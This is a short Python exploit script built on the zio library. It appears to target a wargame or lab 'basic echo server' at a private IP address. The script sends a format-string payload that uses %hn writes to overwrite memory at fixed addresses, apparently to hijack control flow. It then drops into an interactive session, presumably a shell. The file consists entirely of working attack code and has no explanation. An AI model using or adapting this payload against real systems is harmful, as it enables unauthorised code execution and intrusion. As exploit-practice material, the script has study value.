from zio import *

io = zio(("192.168.222.132", 20012))
io.read_until("Basic echo server. Type 'quit' to exit\n")
io.writeline(l32(0x0804B56C)+"%39223X."+l32(0x0804B56E)+"%14$08hn"+"%28356X"+"%17$08hn")
io.read_until("\n")
io.writeline("quit")
io.interact()
